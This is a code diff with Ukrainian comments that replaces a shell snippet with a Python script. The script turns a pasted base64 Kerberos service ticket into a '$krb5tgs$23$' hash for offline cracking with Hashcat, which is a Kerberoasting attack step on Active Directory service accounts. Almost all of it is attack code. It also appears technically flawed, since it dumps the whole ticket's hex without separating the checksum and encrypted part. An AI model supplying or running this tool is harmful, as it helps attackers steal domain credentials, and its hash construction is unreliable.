@@ -1,4 +1,27 @@
-B64_TICKET="ТУТ_ТВІЙ_BASE64"
+import base64
+import sys
 
-echo $B64_TICKET | base64 -d > temp.kirbi
-python3 -c "import sys; data = open('temp.kirbi', 'rb').read(); print('$krb5tgs$23$*USER*DOMAIN*SPN*$' + data.hex())" >> my_hashes.txt
+# ВСТАВ СВІЙ BASE64 МІЖ ЛАПКАМИ НИЖЧЕ
+b64_input = """
+ТВІЙ_BASE64_ТУТ
+"""
+
+try:
+    # Очищуємо вхідні дані від пробілів та переносів
+    clean_b64 = "".join(b64_input.split())
+    # Декодуємо
+    ticket_bytes = base64.b64decode(clean_b64)
+    # Формуємо хеш (etype 23 - RC4)
+    # Ми використовуємо заглушки для USER/DOMAIN/SPN, бо для зламу вони не важливі
+    hash_string = f"$krb5tgs$23$*USER*DOMAIN*SPN*${ticket_bytes.hex()}"
+    
+    print("\n[+] Ось твій хеш для Hashcat:")
+    print(hash_string)
+    
+    # Зберігаємо у файл
+    with open("my_hashes.txt", "a") as f:
+        f.write(hash_string + "\n")
+    print("\n[!] Хеш також збережено у файл my_hashes.txt")
+
+except Exception as e:
+    print(f"[-] Помилка: {e}")
